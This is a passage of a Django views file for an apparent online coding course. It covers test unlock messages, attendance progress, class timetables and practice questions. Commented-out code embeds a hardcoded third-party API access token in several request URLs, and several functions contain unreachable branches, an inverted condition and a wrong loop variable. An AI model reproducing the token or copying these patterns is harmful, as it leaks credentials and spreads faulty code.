#                     SavePracticeCode.objects.filter(question_id=check_["q_id"], student_id=std_id[0]).update(code_text="")
#                     if len(pre_attempt) == 0:
#                         CompilerQuestionAtempt.objects.create(question_id = check_["q_id"], student_id=std_id[0], attepmt_number=1)
#                     else:
#                         pre_attempt_number = max(pre_attempt)
#                         now_attempt_number = pre_attempt_number+1
#                         CompilerQuestionAtempt.objects.create(question_id = check_["q_id"], student_id=std_id[0], attepmt_number=now_attempt_number)
#             return Response({"status":True, "message":"Questions Sumited Successfully"})
#         except Exception as e :
#             return Response({"error":f"{e}"})


# #new
# class StudentallMockQuestionSubmissionResponce(ListAPIView):
#     authentication_classes = (TokenAuthentication,)
#     permission_classes = (IsAuthenticated,)

#     def get(self, request):
#         try:
#             main_data = []
#             user_id = request.user.id
#             std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
#             if len(std_id) > 0 :
#                 std_id = std_id[0]
#             else:
#                 std_id = ""
#             api_result = []
#             main_data_id = request.GET.get("main_data_id")
#             check_ans = CompilerQuestionAtempt.objects.filter(id=main_data_id)
#             if check_ans.exists():
#                 get_ans = check_ans.first()
#                 student_id = get_ans.student.id
#                 ques_id = get_ans.question.id
#                 previous_attempts = CompilerQuestionAtempt.objects.filter(question_id=ques_id,student_id=student_id,question__practice_mock=False).values("id","status","load_template__compiler","practic_time")
#                 source_code = get_ans.student_ans
#                 compiler = str(get_ans.load_template.compiler).split("||")
#                 compiler_id = compiler[1]
#                 problem_id = get_ans.question.prob_id
#                 url1 = 'https://31c7692b.problems.sphere-engine.com/api/v4/submissions?access_token=3d839c6883687fa7e1db43995c8d60c2'
#                 headers = {'Content-Type': 'application/json'}
#                 triple_quoted_string = '''{}'''.format(source_code)
#                 payload_for_post = {
#                     "compilerId": compiler_id,
#                     "source": triple_quoted_string,
#                     "problemId": problem_id
#                 }
#                 response = requests.post(url1, headers=headers, json=payload_for_post)
#                 if response.status_code == 201 :
#                     data = json.loads(response.text)

#                     get_sphere_engine_problems_id = data['id']
#                     time.sleep(3)
#                     url2 = f'https://31c7692b.problems.sphere-engine.com/api/v4/submissions?ids={get_sphere_engine_problems_id}&access_token=3d839c6883687fa7e1db43995c8d60c2'
#                     response2 = requests.get(url2)
#                     main_data = json.loads(response2.text)
#                     get_ans.code_response = response2.text
#                     get_ans.submissions_id = get_sphere_engine_problems_id
#                     # if code accepted
                    
#                     res_ids = main_data['items'][0]['id']
#                     # print("res_ids------------------>", res_ids)
#                     if main_data['items'][0]['result']['status']['name'] == "accepted" :
#                         url3 = f"https://31c7692b.problems.sphere-engine.com/api/v4/submissions/{res_ids}/output?access_token=3d839c6883687fa7e1db43995c8d60c2"
#                         response3 = requests.get(url3)
#                         parsed_json = response3.text
#                         data_list = str(parsed_json).split("\n")
#                         dataset_index = data_list.index('DATASET NUMBER: 0')
#                         dataset_values = []
#                         for value in data_list[dataset_index + 1:]:
#                             if not value:
#                                 break
#                             dataset_values.append(value)
#                         dataset_values = [int(value) for value in dataset_values]
#                         api_result.append({
#                             "status":"accepted",
#                             "data":dataset_values       
#                             })
#                         get_ans.status = True
#                         get_ans.save()
#                     # if code compilation error
#                     elif main_data['items'][0]['result']['status']['name'] == "compilation error" :
#                         url4 = f"https://31c7692b.problems.sphere-engine.com/api/v4/submissions/{res_ids}/cmpinfo?access_token=3d839c6883687fa7e1db43995c8d60c2"
#                         response4 = requests.get(url4)
#                         api_result.append({
#                             "status":"compilation error",
#                             "data":response4.text             
#                             })
#                     # if code wrong answer
#                     elif main_data['items'][0]['result']['status']['name'] == "wrong answer" :
#                         url5 = f"https://31c7692b.problems.sphere-engine.com/api/v4/submissions/{res_ids}/error?access_token=3d839c6883687fa7e1db43995c8d60c2"
#                         response5 = requests.get(url5)
#                         api_result.append({
#                             "status":"wrong answer",
#                             "data":response5.text            
#                             })
#             return Response({"main_data":main_data,"source_code":"source_code","previous_attempts":previous_attempts, "api_result":api_result})
#         except Exception as e :
#             return Response({"error":f"{e}"})




def get_prc_msg(std_id, course_id, c_week, completed_classes):
    try:
        user_practice_check = MessageDetails.objects.filter(student_id=std_id[0], course_id=course_id[0], practice= True).order_by("-message_created").values("current_practice_unlock_week")
        # pactice_msg_list = {}
        if user_practice_check:
            current_practice_unlock_week = user_practice_check[0]["current_practice_unlock_week"]
            if int(current_practice_unlock_week) <  int(c_week):
                course_name = Course.objects.filter(id = course_id[0]).values("name")[0]["name"]
                title = f"practice"
                content = f"your {course_name}'s Week-{int(c_week)} Practice Test is unlocked"
                # mock_msg_list["message"] = f"{title}-------{content}"
                MessageDetails.objects.create(student_id = std_id[0], course_id = course_id[0], current_practice_lock_week = f"{str(c_week)}", title=title, content=content, practice= True)       
        else:
            if int(len(completed_classes)) >= 1 and int(len(completed_classes)) <= 24:
                course_name = Course.objects.filter(id = course_id[0]).values("name")[0]["name"]
                title = f"practice"
                content = f"your {course_name}'s Week-{int(c_week)} Practice Test is unlocked"
                # mock_msg_list["message"] = f"{title}-------{content}"
                MessageDetails.objects.create(
                    student_id = std_id[0], 
                    course_id = course_id[0], 
                    current_practice_unlock_week = f"{str(c_week)}", 
                    title=title, 
                    content=content, 
                    practice= True)
        return True
    except:
        return False

def get_quiz_msg(std_id, course_id, c_week, completed_classes):
    try:
        user_quiz_check = MessageDetails.objects.filter(student_id=std_id[0], course_id=course_id[0], quiz = True).order_by("-message_created").values("current_quiz_unlock_week")
        # quize_msg_list = {}
        if user_quiz_check:
            current_quiz_unlock_week = user_quiz_check[0]["current_quiz_unlock_week"]
            # current_quiz_unlock_week means pre_week
            pre_week_quiz_score_list = list(QuizAttempt.objects.filter(student_id=std_id[0], quiz__week = str(current_quiz_unlock_week)).values_list("score", flat=True))
            pre_week_db_max_score_list = QuestionTimer.objects.filter(exam_field="Quiz", week=str(current_quiz_unlock_week))
            if len(pre_week_db_max_score_list)==0:
                pre_week_db_max_score = 0
            else:
                pre_week_db_max_score = pre_week_db_max_score_list.values("week_pass_percent")[0]["week_pass_percent"]
            if len(pre_week_quiz_score_list) == 0:
                pre_week_quiz_score = 0
            else:
                pre_week_quiz_score = max(pre_week_quiz_score_list)

            if int(c_week) > int(current_quiz_unlock_week):
                if pre_week_quiz_score >= pre_week_db_max_score:
                    course_name = Course.objects.filter(id = course_id[0]).values("name")[0]["name"]
                    title = f"quiz"
                    content = f"your {course_name}'s {int(c_week)} quiz Test unlocked"
                    #for test
                    # quize_msg_list["message"] = f"{title}---{content}"
                    MessageDetails.objects.create(student_id = std_id[0], course_id = course_id[0], current_quiz_unlock_week = f"{str(c_week)}", title=title, content=content, quiz = True)
                else:
                    course_name = Course.objects.filter(id = course_id[0]).values("name")[0]["name"]
                    title = f"quiz"
                    content = f"your {course_name}'s week-{int(c_week)} quiz is ready, but Your faile  in previous week"
                    #for test
                    # quize_msg_list["message"] = f"{title}---{content}"
                    MessageDetails.objects.create(student_id = std_id[0], course_id = course_id[0], current_quiz_unlock_week = f"{str(c_week)}", title=title, content=content, quiz = True)
            else:
                pass
        else:
            if int(c_week) > 1:
                if int(c_week) == 1:
                    course_name = Course.objects.filter(id = course_id[0]).values("name")[0]["name"]
                    # current_week_unlock = int(c_week)
                    title = f"quiz"
                    content = f"your {course_name}'s {int(c_week)} quiz Test unlocked"
                    MessageDetails.objects.create(student_id = std_id[0], course_id = course_id[0], current_quiz_unlock_week = f"{str(c_week)}", title=title, content=content, quiz = True)
                else:
                    pre_week_quiz_score_list = list(QuizAttempt.objects.filter(student_id=std_id[0], quiz__week = str(c_week-1)).values_list("score", flat=True))
                    pre_week_db_max_score_list = QuestionTimer.objects.filter(exam_field="Quiz", week=str(c_week-1))
                    if len(pre_week_db_max_score_list):
                        pre_week_db_max_score = 0
                    else:
                        pre_week_db_max_score = pre_week_db_max_score_list.values("week_pass_percent")[0]["week_pass_percent"]
                    if len(pre_week_quiz_score_list) == 0:
                        pre_week_quiz_score = 0
                    else:
                        pre_week_quiz_score = max(pre_week_quiz_score_list)
                    
                    if int(pre_week_quiz_score) >= int(pre_week_db_max_score):
                        course_name = Course.objects.filter(id = course_id[0]).values("name")[0]["name"]
                        title = f"quiz"
                        content = f"your {course_name}'s {int(c_week)} quiz Test unlocked"
                        #for test
                        # quize_msg_list["message"] = f"{title}---{content}"
                        MessageDetails.objects.create(student_id = std_id[0], course_id = course_id[0], current_quiz_unlock_week = f"{str(c_week)}", title=title, content=content, quiz = True)
        return True
    except:
        return False

def get_mock_msg(std_id, course_id, c_week):
    try:
        user_mock_check = MessageDetails.objects.filter(student_id=std_id[0], course_id=course_id[0], mock = True).order_by("-message_created").values("current_mock_unlock_week")
        # mock_msg_list = {}
        if user_mock_check:
            current_mock_unlock_week = user_mock_check[0]["current_mock_unlock_week"]
            max_score_list = QuestionTimer.objects.filter(exam_field='Mock', course_id=course_id, week=str(c_week)).values("week_pass_percent")
            if len(max_score_list) == 0:
                max_score = 0
            else:
                max_score = int(max_score_list[0]["week_pass_percent"])
            # pre_week = c_week-1
            this_week_max_score_list = list(CompilerQuestionAtempt.objects.filter(student_id=std_id[0], question__practice_mock = True, question__course_id = course_id[0],  question__week=str(c_week-1)).values_list("score", flat=True))
            if len(this_week_max_score_list) == 0:
                score = 0
            else:
                score = max(this_week_max_score_list)
            if int(current_mock_unlock_week) <  int(c_week):   
                if max_score <= score:
                    course_name = Course.objects.filter(id = course_id[0]).values("name")[0]["name"]
                    title = f"mock"
                    content = f"your {course_name}'s Week-{int(c_week)} Mock Test is unlocked"
                    # mock_msg_list["message"] = f"{title}-------{content}"
                    MessageDetails.objects.create(student_id = std_id[0], course_id = course_id[0], current_mock_unlock_week = f"{str(c_week)}", title=title, content=content, mock = True)
                else:
                    course_name = Course.objects.filter(id = course_id[0]).values("name")[0]["name"]
                    title = f"mock"
                    content = f"your {course_name}'s Week-{int(c_week)} Mock Test is Ready, But You are faile your previous week"
                    # mock_msg_list["message"] = f"{title}-------{content}"
                    MessageDetails.objects.create(student_id = std_id[0], course_id = course_id[0], current_mock_unlock_week = f"{str(c_week)}", title=title, content=content, mock = True)                  
            else:
                pass
        else:
            if int(c_week) > 1:
                if int(c_week) == 1:
                    print("week1")
                    course_name = Course.objects.filter(id = course_id[0]).values("name")[0]["name"]
                    title = f"mock"
                    content = f"your {course_name}'s Week-{int(c_week)} Mock Test is unlocked"
                    # mock_msg_list["message"] = f"{title}-------{content}"
                    MessageDetails.objects.create(student_id = std_id[0], course_id = course_id[0], current_mock_unlock_week = f"{str(c_week)}", title=title, content=content, mock = True)
                else:
                    print("week2")
                    max_score_list = QuestionTimer.objects.filter(exam_field='Mock', course_id=course_id, week=str(c_week)).values("week_pass_percent")
                    if len(max_score_list) == 0:
                        max_score = 0
                    else:
                        max_score = int(max_score_list[0]["week_pass_percent"])
                    print(course_id[0])
                    this_week_max_score_list = list(CompilerQuestionAtempt.objects.filter(student_id=std_id[0], question__practice_mock = True,  question__week=str(c_week-1)).values_list("score", flat=True))
                    # print(this_week_max_score_list)
                    if len(this_week_max_score_list) == 0:
                        score = 0
                    else:
                        score = max(this_week_max_score_list)
                    # print(max_score, score)
                    if max_score <= score:
                        course_name = Course.objects.filter(id = course_id[0]).values("name")[0]["name"]
                        title = f"mock"
                        content = f"your {course_name}'s Week-{int(c_week)} Mock Test is unlocked"
                        # mock_msg_list["message"] = f"{title}-------{content}"
                        MessageDetails.objects.create(student_id = std_id[0], course_id = course_id[0], current_mock_unlock_week = f"{str(c_week)}", title=title, content=content, mock = True)
            else:
                pass
        return True
    except:
        return False

class GetMessage(ListAPIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)

    def get(self, request):
        try:
            user_id = request.user.id
            std_id = [Student.objects.get(user_id=user_id).id]
            batch_details_user = list(Batch.objects.filter(students__id__in=std_id, completed=False).values_list("id", flat=True))
            current_batch_list = []
            for i in batch_details_user:
                time_table = TimeTable.objects.filter(batch_id = i).values("start_date","start_time")
                # current_batch_ = current_batch(time_table)
                rev_date = Batch.objects.filter(id=i).first().revoke_date
                current_batch_ = current_batch(time_table, rev_date)
                if current_batch_ == True:
                    current_batch_list.append(i)
            # data = []
            # print(current_batch_list)
            data = {}
            for batch_ in current_batch_list:
                course_id = list(Batch.objects.filter(id = batch_).values_list("course_id", flat=True))
                time_table = TimeTable.objects.filter(batch_id = batch_).values("start_date","start_time")
                completed_classes = get_completed_days(list(time_table))
                import math
                c_week = math.ceil(len(completed_classes) / 3)
                if c_week is None:
                    c_week = 0
                # print(c_week, course_id)
                if completed_classes is not None:
                    #quiz---------------------------------------
                    quiz_return_msg = get_quiz_msg(std_id, course_id, c_week, completed_classes)
                    data["quiz_return_msg"] = quiz_return_msg
                    #mock---------------------------------------
                    mock_return_msg = get_mock_msg(std_id, course_id, c_week)
                    data["mock_return_msg"] = mock_return_msg
                    #practice-----------------------------------
                    practice_return_msg = get_prc_msg(std_id, course_id, c_week, completed_classes)
                    data["practice_return_msg"] = practice_return_msg
            return Response({"main_status": True, "data": data})
        except Exception as e :
            return Response({"error":f"{e}"})



class StudentAttendanceProgressBar(ListAPIView): 
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)

    def get(self, request):
        try:
            user_id = request.user.id
            std_id = [Student.objects.get(user_id=user_id).id]
            course_id = request.GET.get("course_id")
            get_batches = BatchJoined.objects.filter(student_id__in=std_id,batch__course_id = course_id).values("batch_id", "batch__course__name", "batch__start_date", "batch__end_date")
            if get_batches.exists():  
               pass
            else:
               return Response({"course_info": "Course not found", "message": 0}, status=status.HTTP_200_OK)
            batch_details = []
            for batch_info in get_batches:
                batch_info = {
                    "batch_id": batch_info["batch_id"],
                    "course_name": batch_info["batch__course__name"],
                    "start_date": batch_info["batch__start_date"],
                    "end_date": batch_info["batch__end_date"],
                }
                batch_details.append(batch_info)

            # Initialize a dictionary to store course-wise attendance details
            course_attendance = defaultdict(lambda: {"total_cls_sum": 0, "completed_classes_sum": 0})
            batch_details_user = list(Batch.objects.filter(students__id__in=std_id, completed=False).values_list("id", flat=True))
            current_batch_list = []
            response_data = []
            for i in batch_details_user:
                time_table = TimeTable.objects.filter(batch_id=i).values("start_date", "start_time")
                # current_batch_ = current_batch(time_table)
                rev_date = Batch.objects.filter(id=i).first().revoke_date
                current_batch_ = current_batch(time_table, rev_date)
                if current_batch_:
                    current_batch_list.append(i)
            if len(current_batch_list) == 0:  
                return Response({"status": "Batch not found"}, status=status.HTTP_400_BAD_REQUEST)
            else:
                for batch_info in batch_details:
                    batch_id = batch_info["batch_id"]
                    time_table = TimeTable.objects.filter(batch_id=batch_id).values("start_date", "start_time")
                    total_cls = len(time_table)
                    completed_classes = get_completed_days(list(time_table))

                    course_name = batch_info["course_name"]
                    start_date =  batch_info["start_date"]
                    end_date = batch_info["end_date"]
                    course_attendance[course_name]["total_cls_sum"] += total_cls
                    course_attendance[course_name]["completed_classes_sum"] += len(completed_classes)
                
                for course_name, attendance_info in course_attendance.items():
                    total_cls_sum = attendance_info["total_cls_sum"]
                    completed_classes_sum = attendance_info["completed_classes_sum"]
                    remaining_classes = total_cls_sum - completed_classes_sum
                    cls_attend_percentage = (completed_classes_sum / total_cls_sum) * 100 if total_cls_sum > 0 else 0
                    if remaining_classes!= 0:

                        response_data.append({
                            "batch_id" : batch_id,
                            "course_name": course_name,
                            "start_date": start_date,
                            "end_date": end_date,
                            "total_class": total_cls_sum,
                            "num_of_completed_classes": completed_classes_sum,
                            "remaining_classes": remaining_classes,
                            "cls_percentage": f"{cls_attend_percentage:.2f}",
                            "status": "",
                        })
                    else:
                        response_data.append({
                        "batch_id" : batch_id,    
                        "course_name": course_name,
                        "start_date": start_date,
                        "end_date": end_date,
                        "total_class": total_cls_sum,
                        "num_of_completed_classes": completed_classes_sum,
                        "remaining_classes": remaining_classes,
                        "cls_percentage": f"{cls_attend_percentage:.2f}",
                        "status": "Classes completed !",
                        })   
                return Response({"coursewise_attendance": response_data, "message": 1}, status=status.HTTP_200_OK)
        except Exception as e:
            return Response({"error": str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
        

class StudentDashboardAllProgressBar(ListAPIView): #updated code 
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    def get(self, request):
        try :
            user_id = request.user.id
            stud_quiz_progress = quiz_progress_bar(user_id) 
            stud_mock_progress = mock_progress_bar(user_id) 
            stud_attend_progress = student_attend_progress_bar(user_id)
            return Response({"main_data1":stud_quiz_progress,"main_data2":stud_mock_progress,"main_data3":stud_attend_progress})
        except Exception as e :
            return Response({"error":f"{e}"}) 


class StudentDashboardUpcomingContestUpdate(ListAPIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)        

    def get(self, request): 
        try:
            user_id = request.user.id
            std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
            get_batch = BatchJoined.objects.filter(student_id__in=std_id).values("batch_id", "batch__course_id")
            # course_ids = [i["batch__course_id"] for i in get_batch]
            batch_ids = [i["batch_id"] for i in get_batch]
            all_timetable = []
            # print(batch_ids)
            # now = datetime.now()
            for i in batch_ids:
                timetable = list(TimeTable.objects.filter(batch_id=i).values("id", "start_date", "start_time", "end_time", "link", "week", "batch_id", "day"))
                all_timetable += timetable
            sorted_all_timetable = sorted(all_timetable, key=lambda x: (x['start_date'], x['start_time']))
            # print(sorted_all_timetable)
            current_datetime = datetime.now()
            past_classes = [c for c in sorted_all_timetable if c['end_time'] and datetime.combine(c['start_date'], c['end_time']) < current_datetime]
            future_classes = [c for c in sorted_all_timetable if c['end_time'] and datetime.combine(c['start_date'], c['end_time']) >= current_datetime]
            for post_class in past_classes:
                post_class["course"] = Batch.objects.filter(id=post_class["batch_id"]).values("course__name")[0]["course__name"]
                post_class["time_table_topic"] = TimeTable.objects.filter(week=post_class["week"], day=post_class["day"], batch_id = post_class["batch_id"]).values("topic")[0]["topic"]
                week_id = list(Week.objects.filter(week=post_class["week"], course_id=int(Batch.objects.filter(id=post_class["batch_id"]).values("course_id")[0]["course_id"])).values("id"))
                print(week_id)
                today_topic_list = Topic.objects.filter(week_id=int(week_id[0]["id"]), day=post_class["day"]).values("name")
                if len(today_topic_list) == 0:
                    post_class["today_topic"] = ""
                else:
                    post_class["today_topic"] = today_topic_list[0]["name"]
            ongoing_data = []
            upcoming_data = []
            if len(future_classes) == 1:
                data = future_classes[0]
                data["course"] = Batch.objects.filter(id=data["batch_id"]).values("course__name")[0]["course__name"]
                data["time_table_topic"] = TimeTable.objects.filter(week=data["week"], day=data["day"], batch_id = data["batch_id"]).values("topic")[0]["topic"]
                week_id = list(Week.objects.filter(week=data["week"], course_id=int(Batch.objects.filter(id=data["batch_id"]).values("course_id")[0]["course_id"])).values("id"))
                today_topic_list = Topic.objects.filter(week_id=int(week_id[0]["id"]), day=data["day"]).values("name")
                if len(today_topic_list) == 0:
                    data["today_topic"] = ""
                else:
                    data["today_topic"] = today_topic_list[0]["name"]
                ongoing_data.append(data)
                data = {"message": "No Upcoming Class"}
                upcoming_data.append(data)
            elif len(future_classes) > 1:
                data = future_classes[0]
                data["course"] = Batch.objects.filter(id=data["batch_id"]).values("course__name")[0]["course__name"]
                data["time_table_topic"] = TimeTable.objects.filter(week=data["week"], day=data["day"], batch_id = data["batch_id"]).values("topic")[0]["topic"]
                week_id = list(Week.objects.filter(week=data["week"], course_id=int(Batch.objects.filter(id=data["batch_id"]).values("course_id")[0]["course_id"])).values("id"))
                today_topic_list = Topic.objects.filter(week_id=int(week_id[0]["id"]), day=data["day"]).values("name")
                if len(today_topic_list) == 0:
                    data["today_topic"] = ""
                else:
                    data["today_topic"] = today_topic_list[0]["name"]
                ongoing_data.append(data)
                data = future_classes[1]
                data["course"] = Batch.objects.filter(id=data["batch_id"]).values("course__name")[0]["course__name"]
                data["time_table_topic"] = TimeTable.objects.filter(week=data["week"], day=data["day"], batch_id = data["batch_id"]).values("topic")[0]["topic"]
                week_id = list(Week.objects.filter(week=data["week"], course_id=int(Batch.objects.filter(id=data["batch_id"]).values("course_id")[0]["course_id"])).values("id"))
                today_topic_list = Topic.objects.filter(week_id=int(week_id[0]["id"]), day=data["day"]).values("name")
                if len(today_topic_list) == 0:
                    data["today_topic"] = ""
                else:
                    data["today_topic"] = today_topic_list[0]["name"]
                upcoming_data.append(data)
            else:
                pass
            data = {"ongoing": ongoing_data, "upcoming": upcoming_data, "recent_passed":past_classes[::-1]}
            return Response({"response_data": data}, status=status.HTTP_200_OK)
        except Exception as e :
            return Response({"error":f"{e}"})

           
class StudentDashboardAllContests(ListAPIView): 
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    def get(self, request):
        try :
            user_id = request.user.id
            stud_quiz_contest = quiz_contest(user_id) 
            stud_mock_contest = mock_contest(user_id) 
            stud_practice_contest= practice_contest(user_id)
            return Response({"main_data1":stud_quiz_contest,"main_data2":stud_mock_contest,"main_data3":stud_practice_contest})
        except Exception as e :
            return Response({"error":f"{e}"}) 




#######################################practice###########################################
#prc
def prc_week_first_questions(course_id, week_id):
    get_q = CompilerQuestion.objects.filter(week=week_id,course_id=course_id,practice_mock=False,disable= False).order_by("day").first()
    
    if get_q:
        topics = {"q_id":get_q.id,"title":get_q.ques_title,"slg":get_q.ques_title.replace(" ", "-")}
    else:
        topics = {"q_id":None,"title":None,"slg":None}
    return topics



#This api for Practice week unlock
class StudentallPracticeWeekLock(ListAPIView):  ###30/01/2024
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)

    def get(self, request):
        try :
            user_id = request.user.id
            course_id = request.GET.get("course_id")
            std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
            get_batch = BatchJoined.objects.filter(student_id__in=std_id).values("batch_id","batch__course_id")
            batch_ids = [i["batch_id"] for i in get_batch]
            # batch_ids = [37]
            if not course_id :
                course_ids = [i["batch__course_id"] for i in get_batch]
                queryset = Course.objects.filter(id__in=course_ids).values("id","name").order_by("name")
                course_id = queryset.first()["id"]
                course_name = queryset.first()["name"]
            else:
                queryset = Course.objects.filter(id=course_id).values("id","name")
                course_id = queryset.first()["id"]
                course_name = queryset.first()["name"]

            all_times = TimeTable.objects.filter(batch__course_id=course_id,batch_id__in=batch_ids).values("week","start_date","start_time","batch__course__name").order_by("id")
            total_week = Course.objects.filter(id=course_id).values("course_duration")[0]["course_duration"]
            week_count = total_week if total_week else 12
            current_datetime = datetime.now()
            formatted_datetime = current_datetime.strftime("%Y-%m-%d-%H:%M:%S")
            week_conut = []
            for i in all_times :
                if f"{i['start_date']}-{i['start_time']}" < formatted_datetime :
                    week_conut.append(i["week"])
            main_data = []
            result = []
            
            
            for i in range(1,week_count+1) :
                total_question = CompilerQuestion.objects.filter(practice_mock=False,week=str(i),course_id = course_id,disable= False)
                complted_question = 0
                pre_week_complted_question = 0
                pre_week_total_question = CompilerQuestion.objects.filter(practice_mock=False,week=str(i-1),course_id = course_id,disable= False)
                for k in total_question.values("id"):
                    check_com = CompilerQuestionAtempt.objects.filter(student_id = std_id[0], button_clicked = 'Submit', question__week = str(i), question__practice_mock=False, status=True,  question_id=int(k["id"])).values("id").count()
                    if check_com >= 1:
                        complted_question = complted_question + 1
                for l in pre_week_total_question.values("id"):
                    check__com = CompilerQuestionAtempt.objects.filter(student_id = std_id[0], button_clicked = 'Submit', question__week = str(i-1), question__practice_mock=False, status=True,  question_id=int(k["id"])).values("id").count()
                    if check__com >= 1:
                        pre_week_complted_question = pre_week_complted_question + 1
                if  week_conut.count(str(i)) >= 1:
                    if i == 1:
                        if len(total_question) != 0:
                            main_data.append({
                                "week": i,
                                "name": course_name,
                                "img": "/images/Practice/week2.svg",
                                "status": True,
                                "completed": complted_question,
                                "total": len(total_question),
                                "isDisabled": False,
                                "condition":""
                                })
                        else:
                            main_data.append({
                                "week": i,
                                "name": course_name,
                                "img": "/images/Practice/week2.svg",
                                "status": True,
                                "completed": complted_question,
                                "total": len(total_question),
                                "isDisabled": False,
                                "condition":"Reach out to support team to unlock this"
                                })
                    else:
                        if len(total_question) != 0:
                            # try:
                            #     check_50 = (pre_week_complted_question/len(pre_week_total_question)) * 100
                            # except:
                            #     check_50 = 0
                            # if check_50 >= 50:
                            main_data.append({
                                "week": i,
                                "name": course_name,
                                "img": "/images/Practice/week2.svg",
                                "status": True,
                                "completed": complted_question,
                                "total": len(total_question),
                                "isDisabled": False,
                                "condition":""
                                })
                            # else:
                            #     main_data.append({
                            #         "week": i,
                            #         "name": course_name,
                            #         "img": "/images/Practice/week2.svg",
                            #         "status": True,
                            #         "completed": complted_question,
                            #         "total": len(total_question),
                            #         "isDisabled": False,
                            #         "condition":f""
                            #         })
                        else:
                            main_data.append({
                                "week": i,
                                "name": course_name,
                                "img": "/images/Practice/week2.svg",
                                "status": True,
                                "completed": complted_question,
                                "total": len(total_question),
                                "isDisabled": False,
                                "condition":"Reach out to support team to unlock this"
                                })
                else:
                    main_data.append({
                        "week": i,
                        "name": course_name,
                        "img": "/images/Practice/week2.svg",
                        "status": False,
                        "completed": complted_question,
                        "total": len(total_question),
                        "isDisabled": True,
                        })
            for i in range(1, len(main_data)+1):
                prc_week_first = prc_week_first_questions(course_id, str(i))
                week_data = main_data[i-1]
                week_data.update(prc_week_first)
                result.append(week_data)
            return Response({"main_data":result})
        except Exception as e :
            return Response({"error":f"{e}"})

#This api for Practice All Question view

class StudentallPracticeQuestionAll(ListAPIView):   ###30/01/2024
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    def get(self, request):
        try :
            user_id = request.user.id
            course_id = request.GET.get("course_id")
            week_id = request.GET.get("week_id")
            # q_id = request.GET.get("week_id")
            get_q = (
                CompilerQuestion.objects
                .filter(
                    week=week_id,
                    course_id=course_id,
                    practice_mock=False,
                    disable=False
                )
                .annotate(question_number_int=Cast('question_number', IntegerField())).order_by("day", "question_number_int"))
            # get_q = CompilerQuestion.objects.filter(week=week_id,course_id=course_id,practice_mock=False,disable= False).order_by("day","question_number")
            # for_day1 = get_q.filter(day=1)
            main_data = []
            topics = []
            for i in range(1,4):
                for_day1 = get_q.filter(day=i)

                if for_day1.exists():
                    for j in for_day1 :
                        q_status= compiler_question_all_practice(user_id,j.id,course_id)
                        slg = j.ques_title.replace(" ", "-")
                        topics.append({"q_id":j.id,"question_number":j.question_number,"title":j.ques_title,"slg":slg, "isOnGoing":True, "que_status":q_status})
                    main_data.append({"id":i,"day":i,"name":f"day{i}","active":True,"topics":topics})
                    
                else:
                    main_data.append({"id":i,"day":i,"name":f"day{i}","active":False,"topics":[]})
                topics = []
            return Response({"main_data":main_data})
        except Exception as e :
            return Response({"error":f"{e}"})
        


#This api for Question view
class StudentallPracticeQuestion(ListAPIView):  #30/01/2024
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    def get(self, request):
        try :
            main_data = []
            user_id = request.user.id
            std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
            q_id = request.GET.get("q_id")
            # get_q = CompilerQuestion.objects.filter(id=q_id,practice_mock=False,disable= False).order_by("question_number")
            get_q = CompilerQuestion.objects.filter(id=q_id,practice_mock=False,disable= False).order_by("day","question_number")
            #next_questions
            get_c_q = CompilerQuestion.objects.filter(id=q_id, practice_mock=False,disable= False).values("week", "course_id")
            if len(get_c_q) != 0:
                week_id = int(get_c_q[0]["week"])
                course_id = int(get_c_q[0]["course_id"])
                # get_q_all = CompilerQuestion.objects.filter(week=week_id,course_id=course_id,practice_mock=False,disable= False).order_by("day")
                get_q_all = CompilerQuestion.objects.filter(week=week_id,course_id=course_id,practice_mock=False,disable= False).order_by("day","question_number")
                get_all_q_id = []
                loop_count = 4
                for k in range(1, loop_count):
                    for_day = get_q_all.filter(day=k)
                    for t in for_day:
                        get_all_q_id.append(t.id)
                # next_q_id = find_next_number(get_all_q_id.copy(), int(q_id))
                next_q_id = get_next_index(get_all_q_id, int(q_id))
            #end
            get_course = CompilerQuestion.objects.get(id=q_id, practice_mock=False,disable= False)
            get_course.course.name if get_course.course else None
            socialSitList = []
            examples = []
            test_case_list = []

            for i in get_q :
                day_value = i.day
                week_value = i.week
                if i.google :
                    socialSitList.append("Google") 
                if i.amazon :
                    socialSitList.append("Amazon")
                if i.microsoft :
                    socialSitList.append("Microsoft")
                if i.meta :
                    socialSitList.append("Facebook")
                if i.linkedin :
                    socialSitList.append("Linkedin")
                if i.uber :
                    socialSitList.append("Uber")
                if i.adobe :
                    socialSitList.append("Adobe")
                if i.cred :
                    socialSitList.append("Cred")
                    
                #testcases
                test_cases = i.test_cases
                if test_cases == {}:
                    test_casess = []
                else:
                    test_casess = test_cases["data"]
                # print(test_casess)
                # if i.test_case is not None and len(i.test_case) != 0:
                #     if i.test_case != "null":
                #         try:
                #             test_case_txt = str(i.test_case).split("\r\n\r\n\r\n")
                #             t_counter = 0
                #             for case_ in test_case_txt:
                #                 t_counter += 1
                #                 caa = str(case_).replace("\r", "").replace("\n", "")
                #                 caaa = caa.split("||")
                #                 case_titel = caaa[0]
                                
                #                 # Split the parts and handle index out of range
                #                 test_case_parts = caaa[1].split("=")
                #                 test_case_titel = test_case_parts[0] + "=" if len(test_case_parts) > 1 else None
                #                 test_case_value = test_case_parts[1] if len(test_case_parts) > 1 else None

                #                 target_parts = caaa[2].split("=")
                #                 target_titel = target_parts[0] + "=" if len(target_parts) > 1 else None
                #                 target_value = target_parts[1] if len(target_parts) > 1 else None

                #                 expected_parts = caaa[3].split("=")
                #                 expected_titel = expected_parts[0] + "=" if len(expected_parts) > 1 else None
                #                 expected_value = expected_parts[1] if len(expected_parts) > 1 else None

                #                 test_case_list.append({
                #                     "id": t_counter,
                #                     "case_titel": case_titel,
                #                     "test_case_titel": test_case_titel,
